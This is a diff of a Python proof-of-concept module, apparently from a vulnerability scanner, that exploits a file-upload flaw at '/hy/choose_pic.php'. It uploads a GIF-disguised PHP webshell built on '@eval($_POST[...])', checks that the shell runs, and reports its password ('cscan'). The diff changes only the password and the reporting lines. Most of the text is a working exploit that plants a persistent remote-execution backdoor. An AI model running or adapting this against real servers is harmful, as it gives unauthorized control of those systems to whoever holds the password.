@@ -68,7 +68,7 @@ class Poc(ABPoc):
         try:
             upload_file_url = '%s/hy/choose_pic.php' % self.target
             gif_file = {'postfile': (
-                'test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
+                'test.gif', 'Gif89a <?php echo(md5("cscan"));@eval($_POST["cscan"]);', 'image/gif')}
             gif_data = {'action': 'upload'}
             upload_content = requests.post(
                 upload_file_url, files=gif_file, data=gif_data).text
@@ -86,12 +86,8 @@ class Poc(ABPoc):
             # 验证是否成功  check
             page_content = requests.get(webshell).text
             if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
-                #args['success'] = True
-                #args['poc_ret']['webshell'] = webshell
-                #args['poc_ret']['post_password'] = 'bb2'
-                #self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已注册用户名：{name}，密码：{passwd}'.format(target=self.target, vulnname=self.vuln.name, name=info, passwd=info))
-                return args
-            return args
+                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，密码：{passwd}'.format(
+                    target=self.target, vulnname=self.vuln.name, passwd="cscan"))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
